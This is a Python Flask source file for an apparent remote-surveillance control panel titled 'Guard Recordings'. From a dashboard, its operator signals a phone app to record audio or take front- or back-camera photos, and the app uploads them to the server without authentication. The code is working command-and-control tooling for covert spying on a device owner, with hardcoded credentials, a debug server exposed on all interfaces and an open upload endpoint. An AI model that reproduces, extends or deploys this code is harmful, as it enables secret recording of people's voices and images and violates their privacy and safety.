import os
import logging
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from threading import Thread
import time

# Initialize Flask app FIRST
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production-12345'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Global variable to track recording signal
recording_signal = False
signal_listeners = []
camera_signal = {'active': False}

# Simple authentication
USERNAME = "Sukh Hacker"
PASSWORD = "sukhbir44@007"  # Change this in production

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return render_template_string(LOGIN_HTML, error='Invalid credentials')
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Dashboard route
@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # List all files (audio + photos)
    files = []
    photos = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            file_info = {
                'name': filename,
                'size': os.path.getsize(filepath),
                'modified': os.path.getmtime(filepath)
            }
            
            if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
                files.append(file_info)
            elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                photos.append(file_info)
                
    except FileNotFoundError:
        os.makedirs(upload_dir, exist_ok=True)
    
    # Sort by modification time (newest first)
    files.sort(key=lambda x: x['modified'], reverse=True)
    photos.sort(key=lambda x: x['modified'], reverse=True)
    
    return render_template_string(DASHBOARD_HTML, files=files, photos=photos[:6])  # Latest 6 photos

# DEBUG ROUTE - YE ADD KARO
@app.route('/debug-files')
def debug_files():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    upload_dir = app.config['UPLOAD_FOLDER']
    files_info = []
    
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            files_info.append({
                'name': filename,
                'size': os.path.getsize(filepath),
                'modified': time.ctime(os.path.getmtime(filepath)),
                'type': 'photo' if filename.lower().endswith(('.jpg', '.jpeg', '.png')) else 'audio'
            })
    except Exception as e:
        return f"Error: {e}"
    
    # HTML format mein return karo
    html = "<h1>Debug Files</h1>"
    html += f"<p>Total files: {len(files_info)}</p>"
    html += "<table border='1'><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th></tr>"
    for file in files_info:
        html += f"<tr><td>{file['name']}</td><td>{file['size']} bytes</td><td>{file['type']}</td><td>{file['modified']}</td></tr>"
    html += "</table>"
    return html

# Camera routes
@app.route('/start-camera-signal', methods=['POST'])
def start_camera_signal():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    data = request.get_json()
    camera_type = data.get('camera_type', 'front')
    
    global camera_signal
    camera_signal = {
        'active': True,
        'camera_type': camera_type,
        'timestamp': time.time()
    }
    
    print(f"Camera signal activated - {camera_type} camera")
    return jsonify({'ok': True, 'message': f'{camera_type} camera signal sent'})

@app.route('/check-camera-signal')
def check_camera_signal():
    global camera_signal
    if camera_signal and camera_signal.get('active'):
        if time.time() - camera_signal.get('timestamp', 0) < 30:
            return jsonify({
                'capture': True,
                'camera_type': camera_signal.get('camera_type', 'front')
            })
    
    camera_signal = {'active': False}
    return jsonify({'capture': False})

@app.route('/camera-signal-received', methods=['POST'])
def camera_signal_received():
    global camera_signal
    camera_signal = {'active': False}
    return jsonify({'ok': True})

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    print("📸 Upload photo endpoint called")
    
    if not session.get('logged_in'):
        print("❌ Unauthorized access")
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    print("📸 Request files:", list(request.files.keys()))
    
    if 'photo' not in request.files:
        print("❌ No photo file in request")
        return jsonify({'ok': False, 'error': 'No photo file'}), 400
    
    photo_file = request.files['photo']
    print("📸 Photo file details:")
    print("   - Filename:", photo_file.filename)
    print("   - Content type:", photo_file.content_type)
    print("   - Content length:", photo_file.content_length if photo_file.content_length else "Unknown")
    
    if photo_file.filename == '':
        print("❌ Empty filename")
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if photo_file:
        timestamp = str(int(time.time()))
        filename = f"camera_photo_{timestamp}.jpg"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        try:
            photo_file.save(filepath)
            file_size = os.path.getsize(filepath)
            print(f"✅ Photo saved: {filename} ({file_size} bytes)")
            print(f"✅ File path: {filepath}")
            print(f"✅ File exists: {os.path.exists(filepath)}")
            
            return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
        except Exception as e:
            print(f"❌ File save error: {e}")
            return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
    
    print("❌ Unknown upload failure")
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Recording signal routes
@app.route('/start-recording', methods=['POST'])
def start_recording():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    global recording_signal
    recording_signal = True
    
    record_time = 15
    if request.is_json:
        data = request.get_json()
        record_time = data.get('record_time', 15)
    
    print(f"Recording signal activated - {record_time} seconds")
    
    for listener in signal_listeners:
        listener['active'] = False
    
    return jsonify({'ok': True, 'message': f'Recording signal sent to app - {record_time}s', 'record_time': record_time})

@app.route('/check-signal')
def check_signal():
    global recording_signal
    return jsonify({'record': recording_signal})

@app.route('/signal-received', methods=['POST'])
def signal_received():
    global recording_signal
    recording_signal = False
    return jsonify({'ok': True})

# File management routes
@app.route('/files/<filename>')
def serve_file(filename):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    safe_filename = secure_filename(filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
    
    if not os.path.exists(filepath):
        return "File not found", 404
    
    return send_file(filepath)

@app.route('/delete/<filename>', methods=['POST'])
def delete_file(filename):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    safe_filename = secure_filename(filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
    
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({'ok': True, 'message': 'File deleted'})
    
    return jsonify({'ok': False, 'error': 'File not found'}), 404

# Recorder page
@app.route('/recorder')
def recorder():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(RECORDER_HTML)

# Upload route for recorder
@app.route('/upload', methods=['POST'])
def upload_recording():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if 'audio' not in request.files:
        return jsonify({'ok': False, 'error': 'No audio file'}), 400
    
    audio_file = request.files['audio']
    if audio_file.filename == '':
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if audio_file:
        filename = secure_filename(audio_file.filename)
        name, ext = os.path.splitext(filename)
        timestamp = str(int(time.time()))
        filename = f"{name}_{timestamp}{ext}"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Mobile upload route
@app.route('/mobile-upload', methods=['POST'])
def mobile_upload():
    try:
        print("Files received:", list(request.files.keys()))
        
        audio_file = None
        if 'file' in request.files:
            audio_file = request.files['file']
            print("Using 'file' field")
        elif 'audio' in request.files:
            audio_file = request.files['audio']
            print("Using 'audio' field")
        
        if not audio_file or audio_file.filename == '':
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        timestamp = str(int(time.time()))
        filename = f"android_recording_{timestamp}.m4a"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        print(f"✅ Mobile recording uploaded: {filename} ({os.path.getsize(filepath)} bytes)")
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    except Exception as e:
        print(f"❌ Upload error: {e}")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Get latest photos API
@app.route('/get-latest-photos')
def get_latest_photos():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    photos = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            if filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                filepath = os.path.join(upload_dir, filename)
                photos.append({
                    'name': filename,
                    'url': f"/files/{filename}",
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
    except FileNotFoundError:
        pass
    
    photos.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify({'ok': True, 'photos': photos[:6]})

# LOGIN_HTML template (same as before)
LOGIN_HTML = """
<!doctype html>
<title>Login - Guard Recordings</title>
<style>
body{font-family:Inter,Arial;background:#f6f8fb;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-container{background:#fff;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.1);width:100%;max-width:400px}
h1{color:#0b74ff;text-align:center;margin-bottom:30px}
.form-group{margin-bottom:20px}
label{display:block;margin-bottom:8px;color:#555;font-weight:500}
input[type="text"],input[type="password"]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box}
.btn-login{width:100%;padding:12px;background:#0b74ff;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px}
.btn-login:hover{background:#0056cc}
.error{color:#dc3545;text-align:center;margin-top:15px}
</style>
<div class="login-container">
    <h1>🔐 Guard Recordings</h1>
    <form method="POST">
        <div class="form-group">
            <label>Username:</label>
            <input type="text" name="username" required>
        </div>
        <div class="form-group">
            <label>Password:</label>
            <input type="password" name="password" required>
        </div>
        <button type="submit" class="btn-login">Login</button>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
    </form>
</div>
"""

# DASHBOARD_HTML template (same as before - copy your existing one)
DASHBOARD_HTML = """
<!doctype html>
<title>Guard Recordings & Camera</title>
<style>
body{font-family:Inter,Arial;padding:20px;background:#f6f8fb;color:#111}
.container{max-width:1100px;margin:0 auto}
header{display:flex;justify-content:space-between;align-items:center}
h1{color:#0b74ff;margin:0}
.controls{margin:20px 0}
.btn{padding:12px 24px;border-radius:8px;border:none;cursor:pointer;font-size:16px;margin-right:12px}
.btn-start{background:#28a745;color:#fff}
.btn-stop{background:#dc3545;color:#fff}
.btn-recorder{background:#0b74ff;color:#fff;text-decoration:none;display:inline-block}
.btn-camera-front{background:#17a2b8;color:#fff}
.btn-camera-back{background:#6f42c1;color:#fff}
.signal-status{padding:8px 12px;border-radius:6px;margin-left:12px;font-size:14px}
.signal-active{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.signal-inactive{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.camera-active{background:#cce7ff;color:#004085;border:1px solid #b3d7ff}
a.logout{background:#6c757d;color:#fff;padding:8px 12px;border-radius:6px;text-decoration:none}
table{width:100%;border-collapse:collapse;margin-top:18px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 6px 18px rgba(16,24,40,.06)}
th,td{padding:12px 14px;border-bottom:1px solid #f1f5f9;text-align:left}
th{background:#0b74ff;color:#fff}
audio{width:240px}
.btn-small{padding:8px 10px;border-radius:6px;border:none;cursor:pointer;font-size:13px}
.btn-download{background:#eef6ff;color:#0b74ff;border:1px solid #d7ecff;text-decoration:none}
.btn-delete{background:#dc3545;color:#fff;border:1px solid rgba(0,0,0,.06)}
.small{font-size:13px;color:#666}
.recording-controls,.camera-controls{background:#fff;padding:20px;border-radius:8px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.control-group{margin-bottom:15px}
.control-group label{display:block;margin-bottom:5px;font-weight:500}
.control-group input{width:100px;padding:8px;border:1px solid #ddd;border-radius:4px;font-size:14px}
.photo-gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;margin-top:20px}
.photo-item{border:1px solid #ddd;border-radius:8px;overflow:hidden;background:#fff}
.photo-item img{width:100%;height:150px;object-fit:cover;cursor:pointer;transition:transform 0.2s}
.photo-item img:hover{transform:scale(1.05)}
.photo-info{padding:10px;background:#f8f9fa;border-top:1px solid #eee}
.photo-name{font-size:12px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.section-title{font-size:18px;font-weight:600;margin-bottom:15px;color:#333;border-bottom:2px solid #0b74ff;padding-bottom:5px}
.refresh-btn{background:#6c757d;color:#fff;padding:8px 12px;border:none;border-radius:4px;cursor:pointer;font-size:12px;margin-left:10px}
</style>
<div class="container">
  <header>
    <h1>🎧 Guard Recordings & Camera</h1>
    <div>
      <a class="logout" href="/logout" style="margin-right:12px">Logout</a>
      <a href="/recorder" class="btn-recorder btn-small">Recorder</a>
    </div>
  </header>
  
  <!-- Camera Controls Section -->
  <div class="camera-controls">
    <div class="section-title">
      📸 Remote Camera Control 
      <button class="refresh-btn" onclick="refreshPhotos()">🔄 Refresh Photos</button>
    </div>
    
    <div class="controls">
      <button class="btn btn-camera-front" onclick="startCamera('front')">📱 Front Camera</button>
      <button class="btn btn-camera-back" onclick="startCamera('back')">📷 Back Camera</button>
      <button class="btn btn-stop" onclick="stopCamera()">⏹️ Stop Camera Signal</button>
      <span id="cameraStatus" class="signal-status signal-inactive">Camera: Inactive</span>
    </div>
    
    <div id="cameraInfo" class="small" style="margin-top:10px;color:#666;"></div>
    
    <!-- Live Photo Gallery -->
    <div class="section-title">🖼️ Latest Photos</div>
    <div class="photo-gallery" id="photoGallery">
      {% for photo in photos %}
      <div class="photo-item">
        <img src="{{ url_for('serve_file', filename=photo.name) }}" 
             onclick="openPhoto('{{ url_for('serve_file', filename=photo.name) }}')"
             alt="{{ photo.name }}">
        <div class="photo-info">
          <div class="photo-name">{{ photo.name }}</div>
          <div class="small">{{ '%.1f'|format(photo.size / 1024) }} KB</div>
        </div>
      </div>
      {% endfor %}
      {% if photos|length == 0 %}
      <div class="small" style="grid-column:1/-1;text-align:center;padding:40px;color:#999">
        No photos captured yet. Click camera buttons above to capture photos.
      </div>
      {% endif %}
    </div>
  </div>
  
  <!-- Recording Controls Section -->
  <div class="recording-controls">
    <div class="section-title">🎤 Audio Recording Control</div>
    
    <div class="control-group">
      <label for="recordTime">Recording Time (seconds):</label>
      <input type="number" id="recordTime" value="15" min="5" max="60">
    </div>
    
    <div class="controls">
      <button class="btn btn-start" onclick="startRecording()">🎙️ Start Recording Signal</button>
      <button class="btn btn-stop" onclick="stopRecording()">⏹️ Stop Signal</button>
      <span id="signalStatus" class="signal-status signal-inactive">Signal: Inactive</span>
    </div>
    
    <div id="recordingInfo" class="small" style="margin-top:10px;color:#666;"></div>
  </div>
  
  <p class="small">Total files: <strong>{{ files|length + photos|length }}</strong> ({{ files|length }} audio, {{ photos|length }} photos)</p>

  <table>
    <thead>
      <tr><th>Filename</th><th>Size (KB)</th><th>Type</th><th>Play/View</th><th>Download</th><th>Delete</th></tr>
    </thead>
    <tbody>
    {% for f in files %}
      <tr>
        <td style="max-width:320px;word-break:break-all">{{ f.name }}</td>
        <td class="small">{{ '%.1f'|format(f.size / 1024) }}</td>
        <td class="small">🎧 Audio</td>
        <td><audio controls preload="none"><source src="{{ url_for('serve_file', filename=f.name) }}" type="audio/mp4"></audio></td>
        <td><a class="btn-small btn-download" href="{{ url_for('serve_file', filename=f.name) }}" download>⬇️ Download</a></td>
        <td>
          <form method="post" action="{{ url_for('delete_file', filename=f.name) }}" onsubmit="return confirm('Delete file\\\\n\\\\n' + '{{f.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
            <button class="btn-small btn-delete" type="submit">Delete</button>
          </form>
        </td>
      </tr>
    {% endfor %}
    {% for p in photos %}
      <tr>
        <td style="max-width:320px;word-break:break-all">{{ p.name }}</td>
        <td class="small">{{ '%.1f'|format(p.size / 1024) }}</td>
        <td class="small">📸 Photo</td>
        <td>
          <img src="{{ url_for('serve_file', filename=p.name) }}" 
               style="width:80px;height:60px;object-fit:cover;border-radius:4px;cursor:pointer" 
               onclick="openPhoto('{{ url_for('serve_file', filename=p.name) }}')">
        </td>
        <td><a class="btn-small btn-download" href="{{ url_for('serve_file', filename=p.name) }}" download>⬇️ Download</a></td>
        <td>
          <form method="post" action="{{ url_for('delete_file', filename=p.name) }}" onsubmit="return confirm('Delete photo\\\\n\\\\n' + '{{p.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
            <button class="btn-small btn-delete" type="submit">Delete</button>
          </form>
        </td>
      </tr>
    {% endfor %}
    {% if files|length == 0 and photos|length == 0 %}
      <tr><td colspan="6" class="small">No files yet.</td></tr>
    {% endif %}
    </tbody>
  </table>
</div>

<script>
let signalCheckInterval;
let cameraCheckInterval;
let recordingTime = 15;

// Recording Functions
function startRecording() {
    recordingTime = parseInt(document.getElementById('recordTime').value) || 15;
    if (recordingTime < 5) recordingTime = 5;
    if (recordingTime > 60) recordingTime = 60;
    
    document.getElementById('recordingInfo').textContent = `Recording will be ${recordingTime} seconds`;
    
    fetch('/start-recording', { 
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ record_time: recordingTime })
    })
    .then(r => r.json())
    .then(data => {
        if(data.ok) {
            document.getElementById('signalStatus').className = 'signal-status signal-active';
            document.getElementById('signalStatus').textContent = 'Signal: Active';
            
            signalCheckInterval = setInterval(checkSignalStatus, 2000);
            setTimeout(() => stopRecording(), 30000);
        }
    })
    .catch(err => console.error('Error:', err));
}

function stopRecording() {
    if(signalCheckInterval) clearInterval(signalCheckInterval);
    document.getElementById('signalStatus').className = 'signal-status signal-inactive';
    document.getElementById('signalStatus').textContent = 'Signal: Inactive';
    document.getElementById('recordingInfo').textContent = '';
}

function checkSignalStatus() {
    fetch('/check-signal')
    .then(r => r.json())
    .then(data => {
        if(!data.record) stopRecording();
    });
}

// Camera Functions
function startCamera(cameraType) {
    const cameraName = cameraType === 'front' ? 'Front' : 'Back';
    document.getElementById('cameraInfo').textContent = `${cameraName} camera signal sent to app`;
    
    fetch('/start-camera-signal', { 
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ camera_type: cameraType })
    })
    .then(r => r.json())
    .then(data => {
        if(data.ok) {
            document.getElementById('cameraStatus').className = 'signal-status camera-active';
            document.getElementById('cameraStatus').textContent = `Camera: ${cameraName} Active`;
            
            cameraCheckInterval = setInterval(checkCameraStatus, 2000);
            setTimeout(() => {
                stopCamera();
                // Photo capture ke baad gallery refresh karo
                setTimeout(refreshPhotos, 3000);
            }, 30000);
        }
    })
    .catch(err => console.error('Error:', err));
}

function stopCamera() {
    if(cameraCheckInterval) clearInterval(cameraCheckInterval);
    document.getElementById('cameraStatus').className = 'signal-status signal-inactive';
    document.getElementById('cameraStatus').textContent = 'Camera: Inactive';
    document.getElementById('cameraInfo').textContent = '';
}

function checkCameraStatus() {
    fetch('/check-camera-signal')
    .then(r => r.json())
    .then(data => {
        if(!data.capture) {
            stopCamera();
            // Signal complete hone par gallery refresh karo
            setTimeout(refreshPhotos, 2000);
        }
    });
}

function openPhoto(photoUrl) {
    window.open(photoUrl, '_blank');
}

// Photo Gallery Functions
function refreshPhotos() {
    console.log("🔄 Refreshing photos...");
    fetch('/get-latest-photos')
    .then(r => {
        console.log("📡 Photos API response status:", r.status);
        return r.json();
    })
    .then(data => {
        console.log("📸 Photos data received:", data);
        if(data.ok) {
            const gallery = document.getElementById('photoGallery');
            console.log("📸 Number of photos:", data.photos.length);
            
            if(data.photos.length === 0) {
                gallery.innerHTML = '<div class="small" style="grid-column:1/-1;text-align:center;padding:40px;color:#999">No photos captured yet. Click camera buttons above to capture photos.</div>';
                return;
            }
            
            gallery.innerHTML = data.photos.map(photo => `
                <div class="photo-item">
                    <img src="${photo.url}?t=${new Date().getTime()}" 
                         onclick="openPhoto('${photo.url}')" 
                         alt="${photo.name}"
                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZGRkIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iIzk5OSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlBob3RvIEVycm9yPC90ZXh0Pjwvc3ZnPg=='; console.error('Image load error:', '${photo.url}')">
                    <div class="photo-info">
                        <div class="photo-name">${photo.name}</div>
                        <div class="small">${Math.round(photo.size / 1024)} KB</div>
                    </div>
                </div>
            `).join('');
        } else {
            console.error("❌ Photos API error:", data);
        }
    })
    .catch(err => {
        console.error("❌ Error refreshing photos:", err);
        const gallery = document.getElementById('photoGallery');
        gallery.innerHTML = '<div class="small" style="grid-column:1/-1;text-align:center;padding:40px;color:red">Error loading photos. Check console.</div>';
    });
}

// Auto-refresh photos every 10 seconds
setInterval(refreshPhotos, 10000);

// Load photos on page load
document.addEventListener('DOMContentLoaded', function() {
    refreshPhotos();
});

// Update recording info when input changes
document.getElementById('recordTime').addEventListener('change', function() {
    const time = parseInt(this.value) || 15;
    if (time < 5) this.value = 5;
    if (time > 60) this.value = 60;
});
</script>
"""

# RECORDER_HTML template (same as before)
RECORDER_HTML = """
<!doctype html>
<title>Audio Recorder</title>
<style>
body{font-family:Inter,Arial;padding:20px;background:#f6f8fb;color:#111;max-width:600px;margin:0 auto}
h1{color:#0b74ff}
.controls{margin:20px 0}
.btn{padding:12px 24px;border-radius:8px;border:none;cursor:pointer;font-size:16px;margin-right:12px}
.btn-record{background:#dc3545;color:#fff}
.btn-stop{background:#6c757d;color:#fff}
.btn-upload{background:#28a745;color:#fff}
.visualizer{margin:20px 0;height:80px;border:1px solid #ddd;border-radius:8px}
.recording-status{padding:8px 12px;border-radius:6px;margin-left:12px}
.recording{background:#f8d7da;color:#721c24}
.not-recording{background:#d4edda;color:#155724}
a.back{background:#6c757d;color:#fff;padding:8px 12px;border-radius:6px;text-decoration:none;display:inline-block;margin-bottom:20px}
</style>

<a href="/" class="back">← Back to Dashboard</a>
<h1>🎤 Audio Recorder</h1>

<div class="controls">
    <button class="btn btn-record" onclick="startRecording()">● Start Recording</button>
    <button class="btn btn-stop" onclick="stopRecording()" disabled>■ Stop</button>
    <button class="btn btn-upload" onclick="uploadRecording()" disabled>📤 Upload</button>
    <span id="status" class="recording-status not-recording">Not Recording</span>
</div>

<div class="visualizer" id="visualizer">
    <canvas id="canvas" width="600" height="80"></canvas>
</div>

<audio id="audioPlayback" controls style="width:100%;margin-top:20px"></audio>

<script>
let mediaRecorder;
let audioChunks = [];
let audioContext;
let analyser;
let canvasCtx;
let isRecording = false;

const recordBtn = document.querySelector('.btn-record');
const stopBtn = document.querySelector('.btn-stop');
const uploadBtn = document.querySelector('.btn-upload');
const statusSpan = document.getElementById('status');
const canvas = document.getElementById('canvas');
const audioPlayback = document.getElementById('audioPlayback');

canvasCtx = canvas.getContext('2d');

async function startRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        analyser = audioContext.createAnalyser();
        const source = audioContext.createMediaStreamSource(stream);
        source.connect(analyser);
        analyser.fftSize = 256;
        
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
            const audioUrl = URL.createObjectURL(audioBlob);
            audioPlayback.src = audioUrl;
            uploadBtn.disabled = false;
        };
        
        mediaRecorder.start();
        isRecording = true;
        
        recordBtn.disabled = true;
        stopBtn.disabled = false;
        uploadBtn.disabled = true;
        statusSpan.textContent = 'Recording...';
        statusSpan.className = 'recording-status recording';
        
        visualize();
        
    } catch (err) {
        console.error('Error starting recording:', err);
        alert('Error accessing microphone. Please check permissions.');
    }
}

function stopRecording() {
    if (mediaRecorder && isRecording) {
        mediaRecorder.stop();
        isRecording = false;
        
        recordBtn.disabled = false;
        stopBtn.disabled = true;
        statusSpan.textContent = 'Recording Stopped';
        statusSpan.className = 'recording-status not-recording';
        
        mediaRecorder.stream.getTracks().forEach(track => track.stop());
    }
}

function uploadRecording() {
    if (audioChunks.length === 0) {
        alert('No recording to upload');
        return;
    }
    
    const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
    const formData = new FormData();
    formData.append('audio', audioBlob, 'recording_' + Date.now() + '.m4a');
    
    fetch('/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Recording uploaded successfully!');
            uploadBtn.disabled = true;
        } else {
            alert('Upload failed: ' + data.error);
        }
    })
    .catch(err => {
        console.error('Upload error:', err);
        alert('Upload failed');
    });
}

function visualize() {
    if (!isRecording) return;
    
    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);
    
    function draw() {
        if (!isRecording) return;
        
        requestAnimationFrame(draw);
        analyser.getByteFrequencyData(dataArray);
        
        canvasCtx.fillStyle = 'white';
        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
        
        const barWidth = (canvas.width / bufferLength) * 2.5;
        let barHeight;
        let x = 0;
        
        for (let i = 0; i < bufferLength; i++) {
            barHeight = dataArray[i] / 2;
            
            canvasCtx.fillStyle = `rgb(${barHeight + 100},50,50)`;
            canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
            
            x += barWidth + 1;
        }
    }
    
    draw();
}
</script>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
